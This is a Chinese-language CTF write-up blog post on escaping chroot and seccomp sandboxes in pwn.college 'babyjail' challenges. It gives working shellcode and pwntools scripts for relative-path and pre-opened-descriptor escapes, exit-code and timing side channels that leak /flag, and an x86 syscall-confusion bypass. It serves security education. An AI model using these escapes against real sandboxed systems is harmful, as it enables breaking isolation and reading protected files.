---
layout: post
tags: [pwn]
title: "sandboxing —— escape"
author: wsxk
date: 2024-11-25
comments: true
---

- [1. chroot 逃逸](#1-chroot-逃逸)
  - [1.1 相对路径逃逸](#11-相对路径逃逸)
  - [1.2 利用chroot之前打开的目录/文件描述符实现逃逸](#12-利用chroot之前打开的目录文件描述符实现逃逸)
- [2. chroot + seccomp 逃逸](#2-chroot--seccomp-逃逸)
  - [2.1 利用chroot之前打开的目录/文件描述符实现逃逸](#21-利用chroot之前打开的目录文件描述符实现逃逸)
    - [2.1.1 只允许("openat", "read", "write", "sendfile") ](#211-只允许openat-read-write-sendfile-)
    - [2.1.2 只允许("linkat", "open", "read", "write", "sendfile")](#212-只允许linkat-open-read-write-sendfile)
    - [2.1.3 只允许("fchdir", "open", "read", "write", "sendfile")](#213-只允许fchdir-open-read-write-sendfile)
    - [2.1.4 只允许("chdir", "chroot", "mkdir", "open", "read", "write", "sendfile")](#214-只允许chdir-chroot-mkdir-open-read-write-sendfile)
    - [2.1.5 只允许("read", "exit")](#215-只允许read-exit)
    - [2.1.6 只允许("read", "nanosleep")](#216-只允许read-nanosleep)
    - [2.1.7 只允许("read")](#217-只允许read)
  - [2.2 利用syscall confusion实现逃逸](#22-利用syscall-confusion实现逃逸)
    - [2.2.1 只限制x64，不限制x86](#221-只限制x64不限制x86)
- [3. 父子进程+ seccomp 逃逸](#3-父子进程-seccomp-逃逸)
- [附录：利用chroot之前打开的目录/文件描述符 —— 手法](#附录利用chroot之前打开的目录文件描述符--手法)
  - [附录A：程序本身在chroot之前已打开目录/文件描述符](#附录a程序本身在chroot之前已打开目录文件描述符)
  - [附录B：bash tricks](#附录bbash-tricks)


# 1. chroot 逃逸<br>
chroot详情可看[https://wsxk.github.io/sandboxing/](https://wsxk.github.io/sandboxing/)<br>

## 1.1 相对路径逃逸<br>
前文提到，chroot是改变了"/"在程序的根目录，这意味着**绝对路径的访问会被限制**，但是相对路径(这取决于你是在哪个目录下运行程序的)是可以绕过这个机制的。**如果程序的当前工作目录没有被改变（即没有调用chdir("/")的话），这个方法大有可为**<br>
示例如下:<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-9-25/20241125213653.png)
上述场景中:<br>
```
1. 真flag 位于 /flag
2. 假flag 位于 /tmp/jaio-eyqnjg/flag
3. 程序的当前工作目录是 /home/wsxk/Desktop/CTF/sandboxing
```
因此绕过时使用的是`../../../../../flag`<br><br><br>
当然，如果容器里允许你执行shellocde，那么可以尝试利用之前提到相对路径方法，编写shellcode实现逃逸<br>
当然，这个方法也要求**程序的当前工作目录没有被改变（即没有调用chdir("/")）**
```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 2   # open
lea rdi, [rip+file_path]  # path
mov rsi, 0   # flags O_RDONLY
mov rdx, 0  # 当指定O_CREAT时，设定文件的权限，这里就没意义
syscall

mov rdi, 1  # 输出的文件描述符
mov rsi, rax # 输入的文件描述符
mov rdx, 0   # offset，0就是从头开始
mov r10, 128 # length，长度
mov rax, 40 # sendfile
syscall 
file_path:
.string "../../../flag"
```
编译命令如下:<br>
```
gcc -nostdlib -static shellcode.s -o shellcode-elf
objcopy --dump-section .text=shellcode-raw shellcode-elf
cat shellcode-raw | /path/to/container/path 
```

## 1.2 利用chroot之前打开的目录/文件描述符实现逃逸<br>
条件**进程在调用chroot、chdir之前，打开了一个目录,例子: `open("/", O_RDONLY|O_NOFOLLOW)`**<br>
可以利用这个实现打开的文件描述符，结合`openat`系统调用，在shellcode中编写代码完成逃逸<br>
`openat`的原型解释如下:<br>
```c
int openat(int dirfd, const char *pathname, int flags, mode_t mode);

dirfd：之前打开的目录描述符，一般情况下都是3
pathname：文件路径，如果为绝对路径，则忽略dirfd；如果是相对路径，则相对于 dirfd 指定的目录。
flags：文件打开模式O_RDONLY ，O_WRONLY，O_RDWR
mode：行为模式，例子：O_CREAT（如果文件不存在则创建）。当然一般填0
```

实际执行时的shellcode为<br>
```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 257 #openat
mov rdi, 3 # assume opened dir fd = 3
lea rsi, [rip+file_path]
mov rdx, 0 # O_RDONLY
syscall

mov rdi, 1
mov rsi, rax
mov rdx, 0  # offset
mov r10, 128 # length
mov rax, 40 # sendfile
syscall
file_path:
.string "flag"
```
可以用`cat shellcode.raw  | strace -f  /challenge/babyjail_level3 /`调试系统调用出现的问题<br>
`-f`选项指的是跟随fork继续追踪系统调用。<br>
**注意像strace gdb等调试工具，在调试具有suid权限的程序时，会主动舍弃suid权限，要想继续追踪，需要修改内核文件sudo sysctl kernel.yama.ptrace_scope=0.(当然，如果你直接以root权限允许strace、gdb等，就没这个问题)**<br>

# 2. chroot + seccomp 逃逸<br>
seccomp添加了限制，只允许你调用没被禁用的系统调用，如何根据这些系统调用获取flag就是本章节要讲解的目标<br>
## 2.1 利用chroot之前打开的目录/文件描述符实现逃逸<br>
这个思路之前也提到过，总之就是非常好用。<br>
### 2.1.1 只允许("openat", "read", "write", "sendfile") <br>
在只有4个系统调用被允许时，shellcode编写如下<br>

```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 257 #openat
mov rdi, 3 # assume opened dir fd = 3
lea rsi, [rip+file_path]
mov rdx, 0 # O_RDONLY
syscall

mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 128
mov rax, 40
syscall
file_path:
.string "flag"
```

### 2.1.2 只允许("linkat", "open", "read", "write", "sendfile")<br>
**linkat 是 Linux 系统调用的一部分，用于创建一个硬链接。它比传统的 link 函数功能更灵活，允许通过文件描述符指定路径，支持相对路径，并提供额外的标志来控制操作行为。**<br>

```c
int linkat(int olddirfd, const char *oldpath,
           int newdirfd, const char *newpath, int flags);

olddirfd: 创建硬链接的源文件所在的目录描述符
oldpath： 创建硬链接的源文件路径，相对路径则为olddirfd/oldpath，绝对路径则为oldpath
newdirfd：创建硬链接的目标文件所在的目录描述符
newpath： 创建硬链接的目标文件路径，同oldpath
flags： 当前只有一个 AT_SYMLINK_FOLLOW，如果 oldpath 是一个符号链接，则对其解析为目标文件（默认情况下符号链接被当作普通文件）
```

实际编写的shellcode如下:<br>
```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 265 #linkat
mov rdi, 3 # assume opened dir fd = 3
lea rsi, [rip+file_path]
mov rdx, 3 #assume opened dir fd = 3
lea r10, [rip+test_path]
mov r8, 0 #flags=0
syscall

mov rax, 2 # open
lea rdi, [rip+test_path]  # path
mov rsi, 0   # flags O_RDONLY
mov rdx, 0  # 当指定O_CREAT时，设定文件的权限，这里就没意义
syscall

mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 128
mov rax, 40 # sendfile
syscall
file_path:
.string "flag"
test_path:
.string "/test"
```

### 2.1.3 只允许("fchdir", "open", "read", "write", "sendfile")<br>
`fchdir`的作用与`chdir`类似用于改变当前工作目录,`fchdir`以文件描述符<br>
```c
int fchdir(int fd);
fd： 你要修改的目录的描述符
```
实际shellcode如下:<br>
```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 81 #fchdir
mov rdi, 3 # assume opened dir fd = 3
syscall

mov rax, 2 # open
lea rdi, [rip+file_path]  # path
mov rsi, 0   # flags O_RDONLY
mov rdx, 0  # 当指定O_CREAT时，设定文件的权限，这里就没意义
syscall

mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 128
mov rax, 40 # sendfile
syscall
file_path:
.string "flag"
test_path:
.string "/test"
```

### 2.1.4 只允许("chdir", "chroot", "mkdir", "open", "read", "write", "sendfile")<br>
本质上是利用`chroot需要root权限(CAP_SYS_CHROOT)`，如果程序在执行chroot后仍然保留root权限，可以随时越狱<br>
利用如下原理：<br>
```
1. mkdir test
2. chroot test
3. chdir ../../
主动营造出cwd（当前工作目录）和/不同的场景，从而构造出相对路径逃逸场景
```

```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 83 # mkdir
lea rdi, [rip+test_path]
mov rsi, 511 #0777
syscall

mov rax, 161 # chroot
lea rdi, [rip+test_path]  # path
syscall

mov rax, 80 #chdir
lea rdi, [rip+point_path]
syscall

mov rax, 2 #open
lea rdi, [rip+file_path]
mov rsi, 0
mov rdx, 0
syscall

mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 128
mov rax, 40 # sendfile
syscall
file_path:
.string "flag"
test_path:
.string "test"
point_path:
.string "../../"
```

### 2.1.5 只允许("read", "exit")<br>
这种情况就比较搞了。只能利用exit的退出的返回值来泄露flag信息<br>
但是exit的返回值大小是有限的，要想返回你所需的足够信息，你需要多次调用，这就需要用python来自动化运行了（相信我，你不会希望手打的）<br>
脚本如下:<br>
```python
from pwn import *

flag = ""
for i in range(57):
    p = process(["/challenge/babyjail_level10","/flag"])
    shellcode = """
        mov rdi, 3
        lea rsi, [rip+buffer]
        mov rdx, 0x100
        mov rax, 0
        syscall

        xor rdi, rdi
        mov dil, [rip+buffer+{}]
        mov rax, 60
        syscall
        buffer:
        .space 0x100
    """
    shellcode = shellcode.format(i)
    #print(shellcode)
    shellcode = asm(shellcode,arch="amd64")
    #print(shellcode)
    p.sendline(shellcode)
    p.wait()
    flag += chr(p.returncode)
print(flag)
```

### 2.1.6 只允许("read", "nanosleep")<br>
这种情况可以根据睡眠的时间来获取信息，虽然很抽象，但真的可行！<br>
```c
struct timespec {
    time_t tv_sec;  // 秒数 (seconds)
    long   tv_nsec; // 纳秒数 (nanoseconds), 范围：0 ~ 999,999,999
};

int nanosleep(const struct timespec *req, struct timespec *rem);

//req：指向一个timespec结构体，其结构为
//rem: 睡眠被中断时用来存储剩下的时间，可以直接填NULL
```
泄露信息的脚本如下:<br>
```python
from pwn import *
import time

#context.log_level = 'debug'
flag = "pwn.college{"
for i in range(12,55):
    for j in range(32,128):
        p = process(["/challenge/babyjail_level11","/flag"])
        #print(p.recv())
        shellcode = """
            mov rdi, 3
            lea rsi, [rip+buffer]
            mov rdx, 0x100
            mov rax, 0
            syscall

            xor rdi, rdi
            xor rsi, rsi
            mov sil, [rip+buffer+{}]
            mov dil, {}
            cmp sil, dil
            jne end

            lea rdi, [rip+time]
            mov rsi, 0
            mov rax, 35
            syscall

            end:
            ret
            buffer:
            .space 0x100
            time:
            .quad 1
            .quad 100000
        """
        shellcode = shellcode.format(i,j)
        #print(shellcode)
        shellcode = asm(shellcode,arch="amd64")
        #print(shellcode)
        #with open("shellcode.test","wb") as f:
        #    f.write(shellcode)
        p.sendline(shellcode)
        start_time = time.time()
        p.wait()
        end_time = time.time()
        #print(p.recv())
        p.close()
        if end_time-start_time >= 1:
            #print("hit character:"+ chr(j))
            flag += chr(j)
            print("index:"+chr(i))
            print(flag)
            pause()
            break
        else :
            print("not hit")
            print(end_time-start_time)
flag += "}"
print(flag)
```

### 2.1.7 只允许("read")<br>
核心还是和2.1.6节提到的一样，使用侧信道的方式获取flag<br>
虽然我们不能调用sleep相关的syscall，但是可以手动建造循环来增加运行时间<br>
```python
from pwn import *
import time

#context.log_level = 'debug'
flag = "pwn.college{"
for i in range(12,55):
    for j in range(32,128):
        p = process(["/challenge/babyjail_level12","/flag"])
        #print(p.recv())
        shellcode = """
            mov rdi, 3
            lea rsi, [rip+buffer]
            mov rdx, 0x100
            mov rax, 0
            syscall

            xor rdi, rdi
            xor rsi, rsi
            mov sil, [rip+buffer+{}]
            mov dil, {}
            cmp sil, dil
            jne end

            mov rcx, 1000000000
            mov rax, 0
            loop:
            add rax, 1
            cmp rax, rcx
            jle loop

            end:
            ret
            buffer:
            .space 0x100
        """
        shellcode = shellcode.format(i,j)
        #print(shellcode)
        shellcode = asm(shellcode,arch="amd64")
        #print(shellcode)
        #with open("shellcode.test","wb") as f:
        #    f.write(shellcode)
        p.sendline(shellcode)
        start_time = time.time()
        p.wait()
        end_time = time.time()
        #print(p.recv())
        p.close()
        if end_time-start_time >= 0.07:
            #print("hit character:"+ chr(j))
            flag += chr(j)
            print("index:"+chr(i))
            print(flag)
            print(end_time-start_time)
            #pause()
            break
        else :
            print("not hit")
            print(end_time-start_time)
flag += "}"
print(flag)
```

## 2.2 利用syscall confusion实现逃逸<br>
细节请看[https://wsxk.github.io/sandboxing/](https://wsxk.github.io/sandboxing/)<br>
总之就是**x86的系统调用和x64的系统调用，相同系统调用号指向不同的系统调用**<br>

### 2.2.1 只限制x64，不限制x86<br>
```c
    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: allow).\n");
    ctx = seccomp_init(SCMP_ACT_ALLOW);
    for (int i = 0; i < 512; i++)
    {
        switch (i)
        {
        case SCMP_SYS(close):
            printf("Allowing syscall: %s (number %i).\n", "close", SCMP_SYS(close));
            continue;
        case SCMP_SYS(stat):
            printf("Allowing syscall: %s (number %i).\n", "stat", SCMP_SYS(stat));
            continue;
        case SCMP_SYS(fstat):
            printf("Allowing syscall: %s (number %i).\n", "fstat", SCMP_SYS(fstat));
            continue;
        case SCMP_SYS(lstat):
            printf("Allowing syscall: %s (number %i).\n", "lstat", SCMP_SYS(lstat));
            continue;
        }
        assert(seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0);
    }

    puts("Adding architecture to seccomp filter: x86_32.\n");
    seccomp_arch_add(ctx, SCMP_ARCH_X86);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);
```
这段代码，只允许4个系统调用`close,stat,lstat,fstat`在x64中，系统调用号为：`3,4,5,6`<br>
然而**并没有x86架构的系统调用限制**<br>
因此，只要执行正常的x86架构即可逃逸<br>
```asm
.global _start
_start:
.intel_syntax noprefix
mov eax, 295 #openat
mov ebx, 3 # assume opened dir fd = 3
lea ecx, [eip+file_path]
mov edx, 0 # O_RDONLY
int 0x80

mov ebx, 1
mov ecx, eax
mov edx, 0
mov esi,128
mov eax, 187 # sendfile
int 0x80
file_path:
.string "flag"
```

# 3. 父子进程+ seccomp 逃逸<br>
该场景下，子进程只能跟父进程进行通信，且运用seccomp导致子进程只能使用`("read","write","exit")`这3个系统调用，核心思想是通过操纵子进程的执行来达到操作父进程输出我们所需的信息<br>

```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 1 #write
mov rdi, 4 #assume child_socket fd = 4
lea rsi, [rip+open_flag]
mov rdx, 0x80
syscall


mov rax, 0 #read
mov rdi, 4
lea rsi, [rip+buffer+10]
mov rdx, 0x80
syscall

mov rax, 1 #write
mov rdi, 4
lea rsi, [rip+buffer]
mov rdx, 0x80
syscall

ret

open_flag:
.string "read_file:/flag"
buffer:
.string "print_msg:"
.space 0x100
```

# 附录：利用chroot之前打开的目录/文件描述符 —— 手法<br>
## 附录A：程序本身在chroot之前已打开目录/文件描述符<br>
这种情况就比较好说，重点是记住内核中文件描述符一般是顺序递增的，`0 代表标准输入，1代表标准输出，2代表标准错误，程序另外打开的文件的文件描述符依次是3 4 5...`<br>
如果程序自己就开好了，直接利用就完事了。<br>

## 附录B：bash tricks<br>
核心思路是在允许chroot前，利用/bin/bash自己创建一个文件描述符，让chroot的程序继承父进程的文件描述符。<br>
```shell
exec 3>/flag #文件描述符3绑定/flag文件,只写模式； 实际上 exec 3<>/flag也可以，表示读写模式绑定文件
exec 4</ #文件描述符4绑定/目录  ; 因为目录不能写，只能读，因此只能用<

cat shellcode.raw | /path/to/your/program
```


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>